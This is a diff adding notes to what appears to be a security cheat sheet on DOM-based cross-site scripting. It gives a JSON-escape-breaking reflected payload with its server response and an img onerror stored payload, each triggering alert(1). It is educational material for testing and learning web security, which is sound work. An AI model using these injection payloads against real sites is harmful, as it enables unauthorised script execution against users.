@@ -110,3 +110,19 @@ AngularJS is a popular JavaScript library, which scans the contents of HTML node
 
 ### Reflected DOM XSS
 Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+
+* Payload
+```
+\"-alert(1)}//
+```
+
+Server response:
+```json
+{"results":[],"searchTerm":"\\"-alert(1)}//"}
+```
+
+### Stored DOM XSS
+* Payload
+```
+ <><img src=1 onerror=alert(1)> 
+```
